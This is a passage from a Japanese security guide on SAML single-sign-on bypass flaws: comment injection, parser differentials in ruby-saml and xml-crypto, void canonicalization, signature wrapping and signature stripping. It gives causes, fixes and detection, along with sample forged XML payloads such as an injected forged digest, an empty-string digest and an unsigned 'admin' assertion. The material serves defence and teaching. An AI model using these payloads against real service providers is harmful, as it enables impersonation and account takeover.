> 「リモートの**未認証**攻撃者が、影響を受けるSAMLサービスプロバイダの一次認証（primary authentication）をバイパスできる可能性がある。」

ここで「未認証（unauthenticated）」と書かれている点に注意したい。Duoの製品固有評価では「認証が部分的に必要」だったが、抽象化した脆弱性クラスとしては、攻撃者が何らかの正規アサーションのテンプレートを得られる状況（例: 自分のアカウントを持てる、あるいはアサーションを傍受・再構成できる）では、標的アカウントの認証を突破しうる、という位置づけである。

推奨される緩和策は、各ライブラリの修正版への更新である。

- ruby-saml **v1.7.0 以降**
- python-saml **v2.4.0 以降**
- python3-saml **v1.4.0 以降**
- その他ベンダは各社の更新に従う

> 出典: CERT/CC Vulnerability Note VU#475445 — https://www.kb.cert.org/vuls/id/475445

---

### なぜこの修正が「難しい」のか：正規化と抽出を一致させる

この脆弱性クラスの本質は「**署名が保証する正規形と、アプリが読む値が別々に計算される**」ことにある。したがって修正は、その2つの世界を一致させる方向で行う。Oktaの解説とライブラリ各社のパッチから、実装レベルの防御は次の2系統に集約される。

#### 1. パーサ側でコメントを最初から消す

XMLパーサの設定で、**文書の生成時・パース時の両方でコメントノードを完全に除去する**。こうすればDOMツリーからコメントノードそのものが消え、テキストノードが分断されなくなる（`not-an-` と `admin@okta.com` が1つのテキストノード `not-an-admin@okta.com` に連結される）。結果として、正規化の世界と抽出の世界が同じ文字列を見ることになる。

Oktaの推奨（ライブラリ作者向け）:

> 「XML文書の生成・パース時にすべてのコメントを除去するようパーサを構成すること。」

たとえばDOMを構築した後、コメントノードを走査して削除する擬似コードは次の考え方になる（言語非依存の概念コード。特定ライブラリの内部を再現するものではない）。

```text
# 概念コード：DOM構築後にコメントノードを剥がしてからテキストを読む
for each node in document.traverse():
    if node.type == COMMENT:
        node.remove()          # コメントを消すことでテキストノードが連結される
value = nameID.textContent     # ここで初めて全テキストを取得
```

**なぜこれで直るのか**: 分断の原因はコメントノードが「テキストとテキストの間の仕切り」になっていたことにある。仕切りを取り除けば、抽出ロジックが「最初のテキストノードだけ」を読む素朴な実装のままでも、そのテキストノードが完全な文字列を保持する。

#### 2. 子ノードが複数あるNameIDを拒否する／全子テキストを連結する

より防御的なのは、そもそも**NameIDのような単一値を持つべき要素が複数の子ノードを持っていたら異常とみなして拒否する**アプローチである。あるいは、テキスト抽出時に「最初の子」ではなく**全テキストノードを連結（concatenate）**して取り出す。

Oktaの推奨:

> 「複数の子ノードを含むSAMLノードを拒否すること。子の値を安易に連結して扱わないこと。」

この2つは一見矛盾するように読めるが、要は「**素朴な `firstChild.value` 読みをやめ、要素の意味に合った厳格な取り出しをせよ**」ということである。単一値要素に複数ノードが来る＝攻撃の兆候、と扱うのが最も安全である。

#### 3. 設計レベル：ID正規化とドメイン固定を過信しない

DNGの事例が示すように、**ユーザー名正規化やドメイン省略といった「利便性のための緩い突き合わせ」が攻撃面を広げる**。抽出した識別子を正規化・切り出しする前段で、そもそも改ざんの余地を潰しておくことが重要である。受理するメールドメインを明示的に固定する、識別子を部分一致でなく完全一致で突き合わせる、といった設定は多層防御として有効である。

#### 4. プロトコル選択という視点

Oktaは長期的な指針として、XMLとXMLDSIGに依存しない **OpenID Connect（OIDC）** への移行にも言及している。OIDCはトークンをJSON（JWT）で表現し、署名対象はJSONそのもの（正確にはBase64URLエンコードされたバイト列）であるため、「署名される正規形」と「読み取る値」の乖離が原理的に起きにくい。

> 「OpenID Connect はXMLもXMLDSIGも使わないため、この種の攻撃を受けにくい。」

ただしこれは「SAMLを今すぐ捨てよ」という意味ではない。既存SAMLを運用するなら、上記1〜3の対策と最新ライブラリへの更新が現実解である。

> 出典: A Breakdown of the New SAML Authentication Bypass Vulnerability（Okta Developer Blog） — https://developer.okta.com/blog/2018/02/27/a-breakdown-of-the-new-saml-authentication-bypass-vulnerability

---

### 防御チェックリスト（本節のまとめ）

この脆弱性は2017〜2018年に修正済みだが、**古いライブラリを塩漬けにしている環境や、独自にSAMLパースを実装した箇所**では今なお現実的なリスクである。防御側は次を確認するとよい。

1. **ライブラリのバージョン**: ruby-saml ≥ 1.7.0、python-saml ≥ 2.4.0、python3-saml ≥ 1.4.0、その他は各ベンダの修正版以上か。SAMLを内包する製品（VPN、ゲートウェイ等）も同様に更新されているか。
2. **コメント除去の有無**: 利用するSAMLライブラリ／XMLパーサが、パース時にコメントを剥がす設定になっているか。独自実装なら、DOMからコメントを除去してからNameIDを読んでいるか。
3. **NameID抽出ロジック**: `firstChild` や最初のテキストノードだけを読んでいないか。複数子ノードを異常として弾いているか、全テキストを連結しているか。
4. **突き合わせの厳格性**: メールドメインを固定しているか。識別子を完全一致で照合しているか。過度なユーザー名正規化で攻撃面を広げていないか。
5. **回帰テスト**: `user@example.com` の途中にコメントを差し込んだ（＝正規署名は維持したまま）テストベクタで、抽出結果が変化しないことを自動テストで確認しているか。

これらはいずれも自組織の資産・テスト環境に対する確認であり、実在の第三者サービスや本番環境への無許可の検証を意味しない。防御目的の点検として、自環境のSAML実装が「署名の世界」と「抽出の世界」で同じ文字列を見ているかを確かめることが、本節の実践的な結論である。

## パーサ差異による署名バイパス（2025年CVE群）

2025年、SAML SSO（Security Assertion Markup Language を使ったシングルサインオン）を支えてきた主要ライブラリに、立て続けに「署名が正しく検証されているように見えて、実は別の文書を検証している」という致命的な欠陥が発見された。原因はいずれも **パーサ差異（parser differential）** ―― 同じXML文書を複数のXMLパーサ（あるいは正規化前後の2つの見え方）で解釈したときに結果が食い違う現象 ―― にある。本節では ruby-saml（CVE-2025-25291 / CVE-2025-25292）、xml-crypto/SAMLStorm（CVE-2025-29774 / CVE-2025-29775）、そしてPortSwiggerの「The Fragile Lock」が示した新種のXML Signature Wrapping（XSW）を、仕組みのレベルから読み解く。

これらは互いに独立したCVEだが、根本原因は完全に共通している。**「署名を検証する処理」と「認証情報（誰としてログインするか）を取り出す処理」が、同じXML文書に対して別々のパーサ・別々の見え方を使っており、両者が食い違う。** 攻撃者はこの隙間に割り込み、正当な署名を1つだけ手に入れれば、任意のユーザーになりすませてしまう。

### 前提知識：SAML署名検証はなぜ「2段構え」なのか

まず攻撃を理解する土台として、XML Signature（XMLDSig）による SAML Response の検証がどういう構造かを押さえる。SAML Response（IdP=Identity Provider が発行し、SP=Service Provider が受け取る認証結果の文書）は、単純化すると次の要素を持つ。

- **Assertion（アサーション）**: 「このユーザーは誰か」を表す本体。`NameID`（ユーザー名/メールアドレス等）を含む。ここが改ざんされれば、なりすましが成立する。
- **Signature 要素**: XMLDSig の署名ブロック。内部に `SignedInfo` と `SignatureValue` を持つ。
- **DigestValue（ダイジェスト値）**: Assertion を正規化（後述）してハッシュ化した値。「本体が改ざんされていないこと」の指紋。
- **SignedInfo**: `Reference`（どの要素を、どのハッシュ値で守るか）を含むブロック。**実際に暗号署名される対象はこの SignedInfo だけ** である。
- **SignatureValue**: `SignedInfo` を IdP の秘密鍵で署名した暗号値。

検証は必ず次の **2段構え** になる。ここが全攻撃の急所である。

1. **参照検証（reference validation）**: 署名対象（Assertion）を正規化してハッシュを計算し、`DigestValue` と一致するか確認する。→「本体は改ざんされていないか？」
2. **署名検証（signature validation）**: `SignedInfo` を正規化し、`SignatureValue` を IdP の公開鍵で復号したハッシュと一致するか確認する。→「この DigestValue を含む SignedInfo は、本当に IdP が署名したものか？」

理屈の上では、この2段が鎖のように繋がっていれば安全だ。「IdP が署名した SignedInfo」→「その中の DigestValue」→「その DigestValue と一致する Assertion」→「よってこの Assertion は IdP のお墨付き」。**しかし、この鎖のどこか1箇所で「検証したモノ」と「実際に使うモノ」がすり替われば、鎖は切れる。** パーサ差異は、まさにこのすり替えを引き起こす。

#### 正規化（Canonicalization / C14N）とは何か

XMLは、同じ意味の文書でも書き方に揺れがある。属性の順序、空白、名前空間宣言（`xmlns`）の書き方、コメントの有無などだ。これらを標準形に揃える処理を **正規化（Canonicalization, C14N）** と呼ぶ。ハッシュは「バイト列」に対して計算されるので、署名検証の前に必ず正規化してバイト列を一意に決める必要がある。

重要なのは、**正規化アルゴリズムの多く（Exclusive C14N など）はコメント `<!-- ... -->` を除去する** という点だ。この「コメントが消える／消えない」の差が、後述のSAMLStormの核心になる。

### CVE-2025-25291 / 25292：ruby-saml のパーサ差異（GitHub Blog）

GitHubのセキュリティチームは、自社でのruby-saml採用検討（バグバウンティ評価）の過程で、2024年11月にこの欠陥を発見した。対象は **ruby-saml 1.17.0 以前すべて**、修正版は **1.18.0**（2025年3月公開）。GitLabで実際に悪用可能なことも確認されている。

#### 根本原因：署名検証の途中で2つのパーサを使っていた

ruby-saml は、署名検証という **1本の処理経路の中で、2つの異なるXMLパーサを混在させて** いた。

- **REXML**: 純Ruby実装のXMLパーサ。仕様に厳密でない独特の挙動を持つ。
- **Nokogiri**: libxml2（C実装）をラップしたパーサ。より仕様準拠に近い。

問題は、片方のパーサで取り出した要素を検証し、もう片方のパーサで取り出した要素を実際に使う、という「ねじれ」が生じていた点にある。ブログが示す `validate_signature` の骨格は次の通り。

```ruby
# (1) REXML で Signature 要素を取得
sig_element = REXML::XPath.first(@working_copy, "//ds:Signature", {"ds"=>DSIG})

# (2) 一方、Nokogiri でも同じ XPath で Signature 要素を取得
noko_sig_element = document.at_xpath('//ds:Signature', 'ds' => DSIG)

# (3) SignedInfo の正規化は Nokogiri で
canon_string = noko_signed_info_element.canonicalize(canon_algorithm)

# (4) だが DigestValue の抽出は REXML で
encoded_digest_value = REXML::XPath.first(ref, "./ds:DigestValue", {"ds" => DSIG})
```

`//ds:Signature` という同じXPathクエリでも、**REXMLとNokogiriが別々のSignature要素を返すようにXML文書を細工できれば**、検証の鎖は分断される。具体的には次のねじれが生じる。

- `SignedInfo`（Nokogiriが抽出）は `SignatureValue`（REXMLが抽出）に対して正しく検証が通る。
- Assertion（Nokogiriが抽出）は `DigestValue`（REXMLが抽出）に対して正しくハッシュ照合が通る。
- **しかし、この2つの検証は互いに繋がっていない。** それぞれ単独では「正しい」ので、全体としては署名OKと判定される。

結果として攻撃者は **任意のAssertionを捏造し、任意のユーザーになりすませる**。

#### 攻撃に必要なもの：たった1つの正当な署名

この攻撃の恐ろしさは、前提条件の低さにある。攻撃者に必要なのは **「SAML Response 検証に使われる鍵で作られた、正当な署名を1つ」** だけである。それは例えば：

- 権限のない一般ユーザーとしてログインした際にもらえる、署名済みAssertion
- **署名済みの IdP メタデータ**（公開されていることが多い）

つまり、正規ユーザー1人分のアクセス、あるいは公開情報だけで、管理者を含む任意アカウントへの侵入が可能になる。

具体的な悪用手口の1つは、**`StatusDetail` 要素の中にもう1つの `Signature` を仕込む** ものだった。パーサによっては、この隠しSignatureを本物として拾い、別のパーサはAssertion側の偽Signatureを拾う。これでねじれが完成する。

#### 部分的な緩和と、本質的な修正

ブログは、Nokogiriのパースエラーを厳格に検査する緩和策を紹介している。

```ruby
doc = Nokogiri::XML(xml) do |config|
  config.options = Nokogiri::XML::ParseOptions::STRICT |
                   Nokogiri::XML::ParseOptions::NONET
end
raise "XML errors when parsing: " + doc.errors.to_s if doc.errors.any?
```

これは「実用的な悪用の少なくとも1つ」を止めるが、**パーサ差異という根本原因は解消しない**。本質的な修正は、**「すでに抽出済みの `SignedInfo` の中身から DigestValue を取り出す」** ことだ。別のパーサで独立に取り直すのをやめ、「ハッシュ対象の中身」「ハッシュ値」「署名」を1本の鎖に直結させる。これが 1.18.0 の方針である。

> 出典: GitHub Blog: Sign in as anyone: Bypassing SAML SSO authentication with parser differentials — https://github.blog/security/sign-in-as-anyone-bypassing-saml-sso-authentication-with-parser-differentials/

### CVE-2025-29774 / 29775：SAMLStorm（xml-crypto / WorkOS）

WorkOS が「SAMLStorm」と名付けたこの2件は、Node.js の XML署名ライブラリ **`xml-crypto` v6.0.0 以前** に存在する。修正版は **v6.0.1**、および **v3.2.1 / v2.1.6** へバックポートされた。`xml-crypto` は多数のSAMLライブラリの土台であり、影響範囲は広い。

- `@node-saml/node-saml`
- `samlify`
- `saml2-js`
- `passport-saml` 系（`samlp` 等）
- `saml2-suomifi`

これらは合計で週あたり50万ダウンロード超という規模で使われていた。

#### 根本原因：ダイジェスト照合は「コメント付き」、署名照合は「コメント除去後」

SAMLStormもパーサ差異の一種だが、ruby-saml とは差が生じる場所が違う。ここでの食い違いは **「正規化前の文書」と「正規化後の文書」の間** で起きる。WorkOSの説明を核心だけ引くと次のようになる。

> ダイジェスト照合は「正規化されていない文書（コメントを保持する）」に対して行われ、署名照合は「正規化された文書（コメントが除去される）」に対して行われる。

前述の通り、**多くの正規化アルゴリズムはコメントを除去する**。この非対称性を突く。

#### 攻撃：DigestValue にコメントで「偽のダイジェスト」を注入する

攻撃者は、正当な `DigestValue` の **直前に、XMLコメントとして偽のダイジェスト値を挿入** する。

```xml
<DigestValue><!-- forged_digest -->legitimate_digest</DigestValue>
```

このとき、`xml-crypto` の内部処理は次のように分かれる。

1. **ダイジェスト検証**は `DigestValue` ノードの **「最初の子（first child）」** を読む。正規化されていない文書では、最初の子は **XMLコメント**、すなわち攻撃者の `forged_digest` である。→ 攻撃者が差し替えたAssertionと一致するように仕込める。
2. **署名検証**は正規化済みの `SignedInfo` に対して行われる。正規化でコメントは消えるので、残るのは `legitimate_digest` だけ。→ IdPの正当な署名と一致する。

こうして、**ダイジェスト検証は攻撃者のAssertionを承認し、署名検証はIdPの正当なデータを承認する**。信頼の鎖が真ん中で断ち切られる。実際の改ざんSAML Responseの骨格は次の通りである。

```xml
<saml2p:Response Destination="acsurl" ID="id1857861521424404880641928" ...>
  <saml2:Assertion ID="id1857861521593646366230134" ...>
    <saml2:Issuer>samlissuer</saml2:Issuer>
    <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
      <ds:SignedInfo>
        <ds:Reference URI="#id1857861521593646366230134">
          <ds:DigestValue><!-- forged_digest -->puw8MLNZ67893HzfgbpLjGPfsdSBJueFbcSw2neguIuk=</ds:DigestValue>
        </ds:Reference>
      </ds:SignedInfo>
      <ds:SignatureValue>assertionsignaturevalue</ds:SignatureValue>
    </ds:Signature>
  </saml2:Assertion>
</saml2p:Response>
```

`DigestValue` の中身に注目してほしい。コメント `<!-- forged_digest -->` が「最初の子」として存在し、その後ろに本物のダイジェスト（`puw8ML...`）が続いている。**同じ1つの `DigestValue` 要素が、読み手（正規化の有無）によって2つの異なる値に見える** ―― これがパーサ差異の本質だ。

#### 2つの攻撃経路

- **経路1（アカウント不要）**: 公開されているIdPメタデータから証明書を取得し、偽ダイジェスト・コメント入りのSAML Responseを組み立てる。IdP上に一切アカウントがなくても、任意ユーザーとして認証できてしまう場合がある（IdPがメタデータに署名しているか等の条件による）。
- **経路2（権限昇格）**: 正規のIdPアクセスを持つ攻撃者が、自分自身のSAML Responseを傍受し、属性を改ざん（例：権限を昇格）したうえで偽ダイジェスト・コメントを挿入して検証をすり抜ける。

#### 検知と防御

- **検知**: SAMLログを調べ、`DigestValue` フィールド内にコメントが含まれていないかを確認する。正常なIdPは `DigestValue` にコメントを入れない。
- **修正**: `xml-crypto` を修正版へ即時アップグレードする。
- **多層防御**: 受信したSAML構造が期待する形式と一致するか（署名の参照数が想定通りか等）を、処理前に検証する。

> 出典: WorkOS: SAMLStorm — https://workos.com/blog/samlstorm

### 「The Fragile Lock」：新種XSWとVoid Canonicalization（PortSwigger Research）

PortSwiggerの Zakhar Fedotkin による研究「The Fragile Lock」は、上記CVE群と同じ「2パーサ問題」を、より体系的に掘り下げ、**新種の攻撃クラス** を提示した。対象は Ruby-SAML と PHP-SAML 系（xmlseclibs 等）。従来のXSW（XML Signature Wrapping：署名対象の要素と、実際に処理される要素をすり替える古典的攻撃）を、パーサ差異という現代的な文脈で拡張している。

研究の出発点は、CVE群と同じ発想だ。**署名済みAssertionを盗むのは極めて困難だが、「IdPの秘密鍵で署名された何らかのXML」を再利用するのは容易** である。攻撃者はその1つの正当な署名を、偽のAssertionと結びつけて「あたかも署名されているように」見せかける。

#### 攻撃1：属性汚染（Attribute Pollution）

libxml2（Nokogiri/PHP）もREXMLも、**名前空間を無視した属性検索** の扱いが一貫していない。例えば `ID="1"` と `samlp:ID="2"` のように、名前空間だけ異なる同名属性が共存すると、どちらが返るかは属性の順序やパーサ実装に依存して予測不能になる。

```xml
<samlp:Response ID="attack" samlp:ID="ID">
  <Signature>
    <Reference URI="#ID"/>
  </Signature>
  <samlp:Extensions>
    <Assertion ID="#ID"/>
  </samlp:Extensions>
  <Assertion ID="evil"/>
</samlp:Response>
```

`Reference URI="#ID"` が指す要素を、署名検証器とビジネスロジックが **別々に解決** してしまう。曖昧なID属性をどちらのパーサがどう評価するかで、「署名で守られた要素」と「実際に処理される要素」がずれる。

#### 攻撃2：REXMLの名前空間混同

REXMLは、`xmlns` や `xml:*` といった **XML予約属性を「普通の属性」として内部的に扱う**（仕様準拠パーサとは異なる）。この癖を使うと、**正当な署名をREXMLのXPathクエリから「見えなく」しつつ、Nokogiriには見えたままにできる**。

```xml
<Parent xmlns='http://www.w3.org/2000/09/xmldsig#'>
  <Child xml:xmlns='#anything'>
    <Signature/>
  </Child>
</Parent>
```

`xml:xmlns='#anything'` という不正な属性によって、REXMLの `//ds:Signature` クエリはこの正当なSignatureを取りこぼす。一方Nokogiriには依然として有効なSignatureに見える。REXML側は「署名が無い＝Assertionをそのまま処理」、Nokogiri側は「有効な署名がある」と判断し、ねじれが完成する。

#### 攻撃3：Void Canonicalization（空の正規化）――本研究最大の貢献

この研究の最重要成果が **Void Canonicalization（空の正規化）** と呼ばれる新しい攻撃クラスである。

XML Signature仕様は、ダイジェスト計算の前に必ず正規化を要求する。ところが、**解決できない相対URI名前空間**（例：`xmlns:ns="1"` のように、絶対URIでない名前空間宣言）に正規化処理が出くわすと、libxml2は **エラーを投げる**。問題は、**多くの実装がこのエラーを黙って無視して処理を続け、失敗した正規化結果を「空文字列（void）」として扱ってしまう** ことだ。

```xml
<samlp:Response xmlns:ns="1">
  <samlp:Extensions>
    <Parent xmlns="http://www.w3.org/2000/09/xmldsig#">
      <Child xml:xmlns="#other">
        <Signature>
          <SignedInfo>REAL SIGNATURE</SignedInfo>
        </Signature>
      </Child>
    </Parent>
  </samlp:Extensions>
  <Assertion>
    <Signature>
      <SignedInfo>EMPTY STRING DIGEST</SignedInfo>
    </Signature>
  </Assertion>
</samlp:Response>
```

正規化が「空文字列」に化けると、ダイジェストは **空データに対して計算される**。SHA-256における空データのハッシュは決まった値になる。

```
47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=
```

これは **SHA-256("")** ―― 入力が空バイト列のときの固定ダイジェスト値だ。攻撃者はこの既知の値を `DigestValue` に置くだけで、Assertionをどう改ざんしても「ダイジェスト一致」が常に成立する **「Golden SAML Response」** を作れる。Assertionの中身が何であっても署名検証を通過してしまう、汎用の万能鍵である。

> なぜ空文字列のハッシュが危険なのか：正規化が空を返すなら、攻撃者は署名対象の中身を一切気にせず、常に `47DEQ...` を入れておけばダイジェスト検証を突破できる。「本体を守るはずの指紋」が「常に同じ、中身に依存しない指紋」に退化してしまう。これが Void Canonicalization の破壊力である。

#### 正当な署名の入手先

この一連の攻撃は「IdPが署名した何らかのXML」を1つ必要とするが、その入手は難しくない。

- **SAMLメタデータ**（`?sign=true` 等で署名付きで取得できる場合がある）
- **エラー応答**: IdPは不正なリクエストに対しても、仕様上 **署名付きのエラー応答** を返さねばならない
- **WS-Federationメタデータ**: 主要IdPでは「ほぼ常に公開されている」

#### 攻撃ワークフローの全体像

1. 公開されているIdP署名済みXMLから正当な `<Signature>` を抽出する
2. それをSAMLスキーマ上許される `<Extensions>` 要素に注入する
3. 名前空間混同を使って、その署名をREXMLのAssertion処理から隠す
4. Assertion側に、Void Canonicalization を利用した偽Signature（空文字列ダイジェスト）を作る
5. サーバは「抽出した正当な署名」を検証しつつ、「偽のAssertion」を処理する

#### 影響を受けた実装／受けなかった実装

- **影響あり**: Ruby-SAML（1.18.0 より前のすべて。パッチ 1.12.4 も含む）、PHP-SAML（Void Canonicalization に脆弱）、Rob Richards の xmlseclibs（**3.1.4 で修正**）
- **影響なし**: XMLSec Library、Shibboleth の xmlsectool

研究では GitLab EE 17.8.4 に対する悪用が実証された。メールアドレスのパース上の癖と組み合わせ、偽の応答でアカウントを登録し、認証を完全にバイパスしている。

#### 推奨される防御

- **拡張点の少ない厳格なXMLスキーマを使う**（`<Extensions>` のような自由記述領域が攻撃面になる）
- **署名された要素だけを、以降のあらゆる処理に使う**（署名対象と処理対象を必ず一致させる）
- 最新パッチを即時適用する
- **メールのドメイン接尾辞をアクセス制御に使わない**（パーサの癖を突かれる）

> 出典: PortSwigger Research: The Fragile Lock — https://portswigger.net/research/the-fragile-lock

### まとめ：3つのCVE群が示す共通の教訓

本節で見た3つの事例は、表面的には別々のライブラリ・別々の言語・別々のCVEだが、**同一の設計上の病** から生じている。

| 事例 | ライブラリ | 差異が生じる場所 | 万能鍵となる手口 |
| --- | --- | --- | --- |
| CVE-2025-25291/25292 | ruby-saml (≤1.17.0) | REXML と Nokogiri の2パーサ間 | 隠しSignature（StatusDetail等）で検証対象をすり替え |
| CVE-2025-29774/29775 (SAMLStorm) | xml-crypto (≤6.0.0) | 正規化前（コメント有）と正規化後（コメント無） | `DigestValue` にコメントで偽ダイジェストを注入 |
| The Fragile Lock | Ruby-SAML / PHP-SAML | 2パーサ間＋正規化の失敗処理 | Void Canonicalization（空文字列ダイジェスト） |

共通する本質はただ1つ ―― **「検証したモノ」と「使うモノ」が一致していない**。

XMLDSigのように「文書の一部分だけに署名する」仕組みは、"どの部分が署名で守られているのか" と "その部分を実際に処理に使っているのか" を厳密に一致させ続けないと、パーサの些細な解釈差だけで崩壊する。20年前のSAML実装は、この一致を保証する設計になっておらず、パッチを重ねても新しいパーサ差異が次々と見つかる。

防御者としての実践的な指針は次の通りである。

1. **同じパーサ・同じ文書ビューで、署名検証と情報抽出を一貫して行う**。ハッシュ対象・ハッシュ値・署名を1本の鎖に直結させ、途中で別の手段で取り直さない。
2. **署名されていない要素・部分は、認証判断に一切使わない**。`<Extensions>` や `StatusDetail` のような自由領域は無視する。
3. **正規化の失敗を「空」として黙認しない**。正規化エラーは即座に検証失敗として拒否する。
4. **XMLスキーマを厳格化し、拡張点を最小化する**。曖昧な属性・不正な名前空間宣言・コメントを含む文書は弾く。
5. **依存ライブラリを修正版へ更新する**（ruby-saml 1.18.0 以降、xml-crypto 6.0.1/3.2.1/2.1.6 以降、xmlseclibs 3.1.4 以降）。
6. **検知**として、SAMLログに `DigestValue` 内コメントや、予期しない地理的位置からのSAMLログイン、想定外の署名参照数がないか監視する。

> 本節の内容はすべて **防御・検知・自組織の依存関係監査** を目的としている。実在サービスや本番環境に対する無許可の検証や、破壊的な手順は本書の対象外である。SAML実装を評価する際は、必ず自組織が管理・許可した検証環境で、書面による許可の範囲内で行うこと。

## SAML概説とインジェクション参照

本節では、SAML（Security Assertion Markup Language）を軸にしたSSO（シングルサインオン）実装で繰り返し観測されてきた脆弱性クラスを、業界横断のサーベイ記事と、実務者向けペイロード集の二資料から整理する。前者はSAML/OAuth 2.0/OIDC/JWTという4つのSSO関連技術を横串で比較した「脆弱性の系譜」であり、後者はSAMLレスポンスを直接改ざんするための具体的なXMLペイロード集である。両者を合わせて読むことで、「なぜSAMLはこれほど何度も同じ種類のバグを繰り返すのか」という構造的な理由と、「実際に手を動かすとしたらどのペイロードを組み立てるか」という実装レベルの理解の両方が得られる。

### SAMLが構造的に脆弱性を作り込みやすい理由

SAMLは、IdP（Identity Provider、認証を実施しID情報を発行する側）がSP（Service Provider、ログインを受け入れるアプリ側）に対して、XML形式の「アサーション（assertion、ユーザーの認証結果や属性を記述した署名付きの主張）」を送ることで認証を成立させるプロトコルである。ここでの本質的な難しさは、XMLという構造が「同じ意味データを複数の書き方で表現できる」うえに、XML署名（XML Digital Signature, XMLDSig）は「ドキュメント全体」ではなく「特定のノード（要素）の正規化されたバイト列」に対してハッシュを取り検証するという設計になっている点にある。この結果、署名検証ロジックと、実際に業務処理（誰が認証されたと判断するか）に使われるパース・参照ロジックが「別の実装・別の経路」になりやすく、両者の間にズレがあると「署名は正当だが、業務処理が見ている中身は別物」という状態を作れてしまう。

> ⚠️ **未取得の資料ではない**が、記事本文でも明言されている通り、このクラスのバグは**2012年・2018年・2024年**と、複数の年にわたって形を変えて再発している。SAMLの複雑さそのものが根本原因であるため、「一度直したら終わり」という性質の脆弱性ではない点を強調しておく。

### XML署名ラッピング（XSW: XML Signature Wrapping）攻撃

XSWは、SAMLインジェクションの中核をなす攻撃手法である。考え方はシンプルで、「署名検証コードが見ている要素」と「業務ロジックが読み取る要素」を意図的にズラすことにある。

**仕組み（なぜ成立するか）:**
1. IdPが発行した正規のアサーション（署名付き）はそのままレスポンス内に残す。
2. 攻撃者は、そのレスポンス内に**別の（未署名、または署名対象外の）偽アサーション**を追加で挿入する。
3. XML署名の`<ds:Reference URI="...">`は、署名対象ノードを**IDによる参照**で指定する。SPの実装によっては、「署名検証はReference URIが指すノードに対して行い、業務処理は文書順で最初に見つかったノード（あるいは別の位置のノード）に対して行う」というように、検証対象と処理対象が食い違う。
4. 結果として、署名検証自体は「正規のアサーションに対して」正しくパスするにもかかわらず、SPが実際にログインユーザーとして採用するのは攻撃者が挿入した偽アサーションになる。

PayloadsAllTheThingsのSAML Injectionページでは、この構造を次のように単純化して示している。

```xml
<SAMLResponse>
  <FA ID="evil">
      <Subject>Attacker</Subject>
  </FA>
  <LA ID="legitimate">
      <Subject>Legitimate User</Subject>
      <LAS>
         <Reference Reference URI="legitimate">
         </Reference>
      </LAS>
  </LA>
</SAMLResponse>
```

`Reference URI="legitimate"`が指すのは正規（Legitimate）の要素であり、署名検証はそこに対して行われる。しかし実装によっては、文書内で最初に出現する`Subject`（この例では`FA`＝Forged Assertionの`Attacker`）を業務処理側が採用してしまう。これがXSWの核心であり、実際の攻撃では単純にコピーを前後に置くだけでなく、SOAPの`<Envelope>`や`<Extensions>`、`<Object>`ブロックの中に偽アサーションを埋め込むなど、8種類ものバリエーション（XSW1〜XSW8）が学術研究およびツール実装として整理されている。バリエーションが分かれる理由は、SPの実装ごとに「署名検証ロジックがどのノードを起点にツリーを辿るか」「業務ロジックがどのノードを起点にツリーを辿るか」の実装差があり、その差を突くために挿入位置を変える必要があるためである。

**実際のCVEでの再発:**
- **CVE-2024-45409（Ruby SAML）**: CVSS 9.8。ネットワーク経由・認証不要で任意ユーザーへのなりすましが可能だった。
- **CVE-2024-6202（HaloITSM）**、**CVE-2024-6800（GitHub Enterprise Server）**: 同種のSAML SSOバイパス。
- 2018年には、Duo Securityの研究者らがOneLogin python-saml（**CVE-2017-11427**）、ruby-saml（**CVE-2017-11428**）、saml2-js（**CVE-2017-11429**）、OmniAuth SAML（**CVE-2017-11430**）、Shibboleth OpenSAML C++（**CVE-2018-0489**）という複数の著名ライブラリで、ほぼ同一の設計不備（XML DOM処理でコメントノードや走査順序を正しく扱わない）を横断的に発見し、CERT VU#475445として追跡された。

> 出典: Security Vulnerabilities in SAML, OAuth 2.0, OpenID Connect, and JWT — https://guptadeepak.com/security-vulnerabilities-in-saml-oauth-2-0-openid-connect-and-jwt/

**防御策:** SPの実装は、署名検証で使ったのと**同一のノード**を業務処理でも使用しなければならない。具体的には、署名検証後に「検証済みのDOMサブツリーへの参照」をそのまま業務ロジックに渡し、文書全体を再走査して「最初に見つかったSubject」のような取り方をしないことが必須である。また、レスポンス内に複数のアサーションや複数の署名が存在すること自体を異常とみなし、検出・拒否する実装（SAMLRaiderなどの検査ツールが行うチェック）を導入することが推奨される。

### 署名除去（Signature Stripping）

XSWよりさらに単純な攻撃で、「署名セクションそのものを丸ごと削除する」というものである。PayloadsAllTheThingsの言葉を借りれば、「署名なしのSAMLアサーションを受け入れることは、パスワードを確認せずにユーザー名だけを受け入れるのと同じである」。SPの実装が「署名要素が存在しない場合は検証をスキップする」という誤った分岐を持っていると、攻撃者は署名を単に取り除いた（あるいは最初から付けなかった）アサーションを送るだけで、任意の`NameID`（ユーザー識別子）としてログインできてしまう。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol"
  Destination="http://localhost:7001/saml2/sp/acs/post" ...>
    <saml2:Issuer ...>REDACTED</saml2:Issuer>
    <saml2p:Status ...>
        <saml2p:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success" />
    </saml2p:Status>
    <saml2:Assertion ...>
        <saml2:Issuer ...>REDACTED</saml2:Issuer>
        <saml2:Subject ...>
            <saml2:NameID Format="urn:oasis:names:tc:SAML:1.1:nameidformat:unspecified">admin</saml2:NameID>
            <saml2:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
                <saml2:SubjectConfirmationData NotOnOrAfter="2018-04-22T10:33:53.593Z"
                  Recipient="http://localhost:7001/saml2/sp/acs/post" />
            </saml2:SubjectConfirmation>
        </saml2:Subject>
        <saml2:Conditions NotBefore="2018-04-22T10:23:53.593Z" NotOnOrAfter="2018-04-22T10:33:53.593Z" ...>
            <saml2:AudienceRestriction>
                <saml2:Audience>WLS_SP</saml2:Audience>
            </saml2:AudienceRestriction>
        </saml2:Conditions>
        <saml2:AuthnStatement AuthnInstant="2018-04-22T10:28:49.876Z" ...>
            <saml2:AuthnContext>
                <saml2:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml2:AuthnContextClassRef>
            </saml2:AuthnContext>
        </saml2:AuthnStatement>
    </saml2:Assertion>
</saml2p:Response>
```

